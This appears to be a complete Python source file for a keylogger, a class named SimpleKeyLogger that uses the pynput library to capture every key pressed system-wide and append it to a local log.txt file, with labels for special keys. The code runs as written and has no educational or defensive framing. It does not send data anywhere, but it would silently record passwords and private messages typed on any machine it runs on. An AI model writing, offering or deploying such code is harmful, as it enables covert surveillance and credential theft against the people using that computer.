import pynput.keyboard

class SimpleKeyLogger:
    def __init__(self):
        self.logger = ''

    def append_to_log(self, key_strike):
        
        try:
            with open("log.txt", "a", encoding="utf-8") as new_file:
                new_file.write(key_strike)
        except Exception as e:
            print(f"Error writing to log file: {e}")

    def evaluate_keys(self, key):
        try:
            
            pressed_key = key.char if key.char else ' [UNKNOWN] '
        except AttributeError:
            
            if key == pynput.keyboard.Key.space:
                pressed_key = ' '  
            elif key == pynput.keyboard.Key.enter:
                pressed_key = '\n'  
            elif key == pynput.keyboard.Key.backspace:
                pressed_key = ' [BACKSPACE] '  
            else:
                pressed_key = f' [{key}] '  

        self.append_to_log(pressed_key)

    def start(self):
        with pynput.keyboard.Listener(on_press=self.evaluate_keys) as keyboard_listener:
            keyboard_listener.join()
            
if __name__ == "__main__":
    SimpleKeyLogger().start()
